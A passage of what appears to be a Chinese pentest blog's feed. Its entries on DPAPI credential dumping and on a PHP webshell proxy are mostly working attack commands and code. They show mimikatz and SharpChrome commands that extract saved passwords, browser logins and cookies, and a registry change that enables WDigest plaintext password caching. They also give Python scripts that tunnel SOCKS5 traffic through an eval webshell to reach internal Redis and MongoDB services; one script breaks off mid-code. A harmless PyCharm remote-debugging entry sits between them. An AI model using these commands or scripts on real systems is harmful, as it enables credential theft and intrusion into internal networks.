    <link href="https://jkme.github.io/2020/04/13/dpapi-pass-dump.html"/>
    <id>https://jkme.github.io/2020/04/13/dpapi-pass-dump.html</id>
    <published>2020-04-12T16:00:00.000Z</published>
    <updated>2022-01-21T02:20:13.601Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p><ul><li>IE、Chrome密码登陆表单的自动完成</li><li>邮箱客户端用户密码</li><li>FTP管理账户密码</li><li>远程桌面身份密码</li><li>……</li></ul><p>查找本地的Credentials:<br>通常的保存位置:</p><ul><li><code>%appdata%\Microsoft\Credentials</code></li><li><code>%localappdata%\Microsoft\Credentials</code></li><li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li></ul><p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p><pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">**BLOB**  dwVersion          : 00000001 - 1  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;  dwMasterKeyVersion : 00000001 - 1  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;  dwFlags            : 20000000 - 536870912 (system ; )  dwDescriptionLen   : 00000012 - 18  szDescription      : 本地凭据数据  algCrypt           : 00006610 - 26128 (CALG_AES_256)  dwAlgCryptLen      : 00000100 - 256  dwSaltLen          : 00000020 - 32  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc  dwHmacKeyLen       : 00000000 - 0  pbHmackKey         :   algHash            : 0000800e - 32782 (CALG_SHA_512)  dwAlgHashLen       : 00000200 - 512  dwHmac2KeyLen      : 00000020 - 32  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51  dwDataLen          : 00002a70 - 10864  pbData             : xxxxxxz  dwSignLen          : 00000040 - 64  pbSign             : xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>guidMasterKey指向MasterKey的索引,是凭据的GUID，</p><h3 id="获取MasterKey"><a href="#获取MasterKey" class="headerlink" title="获取MasterKey"></a>获取MasterKey</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::dpapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 374001 (00000000:0005b4f1)Session           : RemoteInteractive from 2User Name         : AdministratorDomain            : PC-201908211659Logon Server      : PC-201908211659Logon Time        : 2020&#x2F;3&#x2F;22 14:23:45SID               : S-1-5-21-4128703178-143578513-755070304-500 [00000000] * GUID      :&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125; * Time      :2020&#x2F;4&#x2F;13 10:45:31 * MasterKey :1d30e724aab2b4ee5c83707c5xxx * sha1(key) :xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据<code>GUID:&#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;</code>找到关联的Masterkey, 这个MasterKey就是加密的密钥</p><p>###解密<br>根据找到的Credentials和MaterKey,使用mimikatz解密:</p><pre class="line-numbers language-none"><code class="language-none">mimikatz dpapi::cred &#x2F;in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\&lt;Credentials&gt; &#x2F;masterkey:&lt;MasterKey&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sharpDPAPI"><a href="#sharpDPAPI" class="headerlink" title="sharpDPAPI"></a>sharpDPAPI</h4><p>自动化利用工具，一键dump，在CNA脚本中修改<code>$SharpDPAPI::AssemblyPath</code>为本机器上面sharpDPAPI.exe的绝对路径，不用上传到目标机器上面，然后:</p><pre class="line-numbers language-none"><code class="language-none"># dump出来masterKeysekurlsa::dpapi# 查看已经缓存的keydpapi::cache# 一键dumpshareDPAPI -dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外可以使用<code>SharepChrome</code>来导出Chrome的密码和历史记录，可以配合<code>SharepWeb</code>导出firefox、EDGE浏览器的信息等</p><pre class="line-numbers language-none"><code class="language-none">SharpChrome.exe cookies &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; &#x2F;unprotectSharpChrome.exe logins &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="高版本限制"><a href="#高版本限制" class="headerlink" title="高版本限制"></a>高版本限制</h4><p>在win10和2012R2以上的时候，默认内存缓存中禁止保存明文密码,需要开启wdigest Auth:</p><ul><li>cmd</li></ul><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>powershell</li></ul><pre class="line-numbers language-none"><code class="language-none">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>关闭命令:</li></ul><pre class="line-numbers language-none"><code class="language-none">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启之后，需要管理员重新登陆才可以抓明文密码:</p><pre class="line-numbers language-none"><code class="language-none">rundll32 user32.dll,LockWorkStationmimikatz:sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></li><li><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/</a></li><li><a href="https://github.com/djhohnstein/SharpWeb">https://github.com/djhohnstein/SharpWeb</a></li><li><a href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a></li><li><a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h3&gt;&lt;p&gt;DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IE、Chrome密码登陆表单的自动完成&lt;/li&gt;
&lt;li&gt;邮箱客户端用户密码&lt;/li&gt;
&lt;li&gt;FTP管理账户密码&lt;/li&gt;
&lt;li&gt;远程桌面身份密码&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;查找本地的Credentials:&lt;br&gt;通常的保存位置:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%appdata%\Microsoft\Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%localappdata%\Microsoft\Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%userprofile%\AppData\Local\Microsoft\Credentials\*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因为文件被隐藏，命令行下需要查看需要加上&lt;code&gt;/a&lt;/code&gt;可以看到:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;dir &amp;#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;获取GUID&quot;&gt;&lt;a href=&quot;#获取GUID&quot; class=&quot;headerlink&quot; title=&quot;获取GUID&quot;&gt;&lt;/a&gt;获取GUID&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# 打印结构体信息
mimikatz dpapi::cred &amp;#x2F;in:&amp;quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : &amp;#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&amp;#125;
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : &amp;#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&amp;#125;
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : 本地凭据数据

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
  dwDataLen          : 00002a70 - 10864
  pbData             : xxxxxxz
  dwSignLen          : 00000040 - 64
  pbSign             : xxxxx
&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Pycharm远程调试Docker</title>
    <link href="https://jkme.github.io/2019/12/13/python-debug.html"/>
    <id>https://jkme.github.io/2019/12/13/python-debug.html</id>
    <published>2019-12-12T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.944Z</updated>
    
    <content type="html"><![CDATA[<p>调试的流水账:</p><p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p><pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没毛病就表示安装成功。</p><p>这个pycharm的包一般在这个目录:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后配置pycharm:</p><pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p><p>在Run/Debug configurations里面，选择添加Python Remote Debug。</p><p>其中的<code>local host name</code>要设置为pycharm机子的IP，PORT随便填，比如11000。<br>设置完成之后，注意设置下Path Mappings，设置好本地主机的路径源代码和远程的路径。如果这里不设置好，在调试的时候Py</p><p>最后把两行代码加到要debug的机子文件上,注意把pycharm-debug.egg添加到路径里面:</p><pre class="line-numbers language-none"><code class="language-none">import syssys.path.append(&#39;&#x2F;root&#x2F;pycharm-debug.egg&#39;)import pydevdpydevd.settrace(&#39;192.168.140.40&#39;, port&#x3D;10000, stdoutToServer&#x3D;True, stderrToServer&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候已经设置全部完成，本地的pycharm启动远程调试，然后在docker上面启动Python应用。</p><p>如果不确定本地的pycharm是不是启动成功了，可以telnet一下对应的端口，会有类似这种内容出现:</p><p><img src="../output/images/15762160114084.jpg"></p><pre class="line-numbers language-none"><code class="language-none">strace -p 27691 -e trace&#x3D;read,write -s 1024<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调试的时候可以看读写调用。</p><h3 id="SSH-Remote-Debug"><a href="#SSH-Remote-Debug" class="headerlink" title="SSH Remote Debug"></a>SSH Remote Debug</h3><p>如果是ssh的Remote Debug，在设置interpreter的时候，设置远程服务器的python解释器就可以了，在Docker里面之所以ssh类型的远程调试失败，应该是Docker的端口没有映射到本地造成的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;调试的流水账:&lt;/p&gt;
&lt;p&gt;原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;python -m easy_install pycharm-debug.egg&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;import pydevd&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;没毛病就表示安装成功。&lt;/p&gt;
&lt;p&gt;这个pycharm的包一般在这个目录:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&amp;#x2F;Applications&amp;#x2F;PyCharm.app&amp;#x2F;Contents&amp;#x2F;debug-eggs&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后配置pycharm:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;在Preferences -&amp;gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:

Flie-&amp;gt;Setting-&amp;gt;Build,Exception,Deployment-&amp;gt;Deployment

添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:

Tools-&amp;gt;Deployment-&amp;gt;Sync with deploymed to sftp&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://jkme.github.io/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP Eval HTTP Proxy</title>
    <link href="https://jkme.github.io/2019/10/23/php-eval-proxy.html"/>
    <id>https://jkme.github.io/2019/10/23/php-eval-proxy.html</id>
    <published>2019-10-22T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.938Z</updated>
    
    <content type="html"><![CDATA[<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p><pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle  HTTP based protocol:    Elastic, CouchDB, Mongodb, Docker  Text-based protocol:    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p><pre class="line-numbers language-none"><code class="language-none">#coding: utf-8import socketimport binasciiimport requestsheaders &#x3D; &#123;&quot;Host&quot;: &quot;&quot;,&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,&quot;Connection&quot;: &quot;close&quot;&#125;url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)s.bind((&quot;127.0.0.1&quot;,8889))s.listen(5)sock, addr_info &#x3D; s.accept()while True:    print &#39;Connect by &#39;, addr_info    data &#x3D; sock.recv(102400)    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;    print payload    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content    print data2    print &quot;sending data&quot;    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p><p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p> <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p><p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p><pre class="line-numbers language-none"><code class="language-none">Connect: 连接之后生成一个cookieForward: 把要请求的数据包放在cookie里面的writebufRead: Regeorg的脚本读取writbuf的数据包之后请求接口服务，比如curl访问内网端口。然后把结果写入到cookie里面的readbuf，读取readbuf的内容Disconnect: 把cookie里面的run标志变为false，cookie就不再使用了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以当Regeorg不能使用的时候，比如第一步的connect无法生成。<br>上面脚本的过程是这样子的: 我看了看regeorg的源代码，百思不得其解为什么connect没生成，调试了几天没结果。（好菜.jpg)，这个时候我发现regeorg的php原理基本就是上面的步骤。所以我就手动写脚本尝试可行。</p><p>有一个不知道是什么坑的问题: 当我把ip作为变量发送到远程服务器的时候，远程服务器会出现epool_wait的错误。但是当整个脚本放在远程服务器的时候就可以运行了。</p><pre class="line-numbers language-none"><code class="language-none">失败:&lt;?php$ip &#x3D; $_POST[&#39;ip&#39;];$port &#x3D; $_POST[&#39;port&#39;];$com &#x3D; $_POST[&#39;command&#39;];$payload &#x3D; $com.&#39;\r\n&#39;;$res &#x3D; fsockopen($ip,(int)$port,$errno, $errstr);&#x2F;&#x2F;$res &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;127.0.0.1:6379&quot;, $errno, $errstr);var_dump($res);stream_set_timeout(1);stream_set_blocking(false);fwrite($res,$raw);while ($o&#x3D;fgets($res,5))&#123;$readbuf .&#x3D; $o;&#125;var_dump($readbuf);fclose($res);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">成功:&lt;?php$res &#x3D; fsockopen(&quot;127.0.0.1&quot;,6379);$raw &#x3D; &quot;info\r\n&quot;;stream_set_timeout($res,1);stream_set_blocking(false);fwrite($res,$raw);$info &#x3D; stream_get_meta_data($res);echo $info[&#39;timed_out&#39;];while ($o &#x3D;fgets($res,5))&#123;        if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;false lala&#39;;&#125;$readBuff .&#x3D; $o;&#125;var_dump($readBuff);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我到了现在这一步，其实是中间发现antsword的扫描端口原理，就是包装好数据包发送到远程服务器，远程服务器做一个eval。</p><p>既然是eval了，那么就是跟xss一个原理: 你有了一个”编辑器”。</p><p>所以呢，再看看前面的regeorg的原理，剩下最后一步了，改造上面的脚本，让他适合proxychains。</p><h3 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h3><pre class="line-numbers language-none"><code class="language-none"># coding: utf-8import socketimport binasciiimport urllibimport sysimport requestsVER &#x3D; &quot;\x05&quot;METHOD &#x3D; &quot;\x00&quot;SUCCESS &#x3D; &quot;\x00&quot;SOCKFAIL &#x3D; &quot;\x01&quot;NETWORKFAIL &#x3D; &quot;\x02&quot;HOSTFAIL &#x3D; &quot;\x04&quot;REFUSED &#x3D; &quot;\x05&quot;TTLEXPIRED &#x3D; &quot;\x06&quot;UNSUPPORTCMD &#x3D; &quot;\x07&quot;ADDRTYPEUNSPPORT &#x3D; &quot;\x08&quot;UNASSIGNED &#x3D; &quot;\x09&quot;def parseSocks5(sock):    nmethods, methods &#x3D; (sock.recv(1), sock.recv(1))    # print nmethods,methods    sock.sendall(VER + METHOD)    ver &#x3D; binascii.b2a_hex(sock.recv(1))    # print &quot;ver:%s &quot; % ver  #socks version: socks5 or socks4    if ver &#x3D;&#x3D; &quot;\x02&quot;:  # this is a hack for proxychains        ver, cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))    else:        cmd, rsv, atyp &#x3D; (sock.recv(1), sock.recv(1), sock.recv(1))    target &#x3D; None    targetPort &#x3D; None    if atyp &#x3D;&#x3D; &quot;\x01&quot;:  # IPv4                # Reading 6 bytes for the IP and Port        target &#x3D; sock.recv(4)        targetPort &#x3D; sock.recv(2)        target &#x3D; &quot;.&quot; .join([str(ord(i)) for i in target])    elif atyp &#x3D;&#x3D; &quot;\x03&quot;:  # Hostname        targetLen &#x3D; ord(sock.recv(1))  # hostname length (1 byte)        target &#x3D; sock.recv(targetLen)        targetPort &#x3D; sock.recv(2)        target &#x3D; &quot;&quot;.join([unichr(ord(i)) for i in target])    elif atyp &#x3D;&#x3D; &quot;\x04&quot;:  # IPv6        target &#x3D; sock.recv(16)        targetPort &#x3D; sock.recv(2)        tmp_addr &#x3D; []        for i in xrange(len(target) &#x2F; 2):            tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))        target &#x3D; &quot;:&quot;.join(tmp_addr)    targetPort &#x3D; ord(targetPort[0]) * 256 + ord(targetPort[1])    # print targetPort    # print target    if cmd &#x3D;&#x3D; &quot;\x02&quot;:  # BIND        raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;)    elif cmd &#x3D;&#x3D; &quot;\x03&quot;:  # UDP        raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;)    elif cmd &#x3D;&#x3D; &quot;\x01&quot;:  # CONNECT        serverIp &#x3D; target        serverIp &#x3D; &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)])    sock.sendall(VER + SUCCESS + &quot;\x00&quot; + &quot;\x01&quot; + serverIp + chr(targetPort &#x2F; 256) + chr(targetPort % 256))    # print &quot;recv: %s&quot; % binascii.b2a_hex(sock.recv(1024))    return target,targetPortdef sendPayload(sock,flag&#x3D;&#39;&#39;):    print &quot;[Prepare Payload]&quot;    try:        data &#x3D; sock.recv(20480)    except:        print &quot;Closing Proxy&quot;        s.close()        exit(0)    if data:        print &quot;&lt;&lt; Recving Data From Client&quot;        tmp_payload &#x3D; &quot;$res &#x3D; fsockopen(&#39;%s&#39;,%s);&quot; % (target, targetPort)        tmp_payload +&#x3D; &quot;$raw &#x3D; hex2bin(&#39;&quot; + binascii.b2a_hex(flag+data) + &quot;&#39;);&quot;        tmp_payload +&#x3D; &quot;stream_set_timeout($res,1);&quot;        # tmp_payload +&#x3D; &quot;stream_set_blocking(true);&quot;        tmp_payload +&#x3D; &quot;fwrite($res,$raw);&quot;        tmp_payload +&#x3D; &quot;while ($o &#x3D;fgets($res,100))&#123;if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;Connect Failed&#39;;&#125;&quot;        tmp_payload +&#x3D; &quot;$readBuff .&#x3D; $o;&#125;&quot;        tmp_payload +&#x3D; &quot;echo $readBuff;&quot;        tmp_payload +&#x3D; &quot;fclose($res);&quot;        # print tmp_payload        payload &#x3D; urllib.quote(tmp_payload)        # print &quot;The payload is: %s&quot; %payload        shell &#x3D; sys.argv[1]        p &#x3D; sys.argv[2]        exp &#x3D; &quot;%s&#x3D;%s&quot; % (p, payload)        content &#x3D; requests.post(shell, 